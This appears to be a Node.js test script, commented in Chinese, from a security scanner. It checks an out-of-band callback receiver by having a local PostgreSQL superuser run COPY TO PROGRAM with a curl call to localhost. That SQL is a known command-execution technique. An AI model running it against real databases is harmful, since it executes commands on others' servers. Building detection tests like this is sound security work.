// OOB 底层链路手动验证：PG 执行 COPY TO PROGRAM curl → 接收端捕获（不经引擎）
import { pathToFileURL } from 'node:url';
import { dirname, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import { createRequire } from 'node:module';

const require = createRequire(new URL('../../server/package.json', import.meta.url));
const { Client } = require('pg');
const { oobReceiver } = await import(pathToFileURL(resolve(dirname(fileURLToPath(import.meta.url)), '../../server/src/core/oobReceiver.js')).href);

// 1) 启动接收端
await oobReceiver.start({ enabled: true, callbackBase: '127.0.0.1:8899', httpPort: 8899, timeoutMs: 6000 });
console.log('接收端已启动');

// 2) PG 直接执行 COPY TO PROGRAM（超管）
const c = new Client({ host: '127.0.0.1', port: 5432, user: 'postgres', password: 'postgres', database: 'oob_lab' });
await c.connect();
const TOKEN = 'manualtest01';
const sql = `COPY (SELECT '') TO PROGRAM 'curl http://127.0.0.1:8899/oob/${TOKEN}'`;
console.log('执行 SQL:', sql);
try {
  await c.query(sql);
  console.log('COPY 执行成功（无报错）');
} catch (e) {
  console.log('COPY 执行报错:', e.message);
}
await c.end();

// 3) 等待 token
const hit = await oobReceiver.waitForToken(TOKEN, 5000);
console.log('token 捕获:', hit ? '✅ 命中' : '❌ 未收到');
process.exit(0);
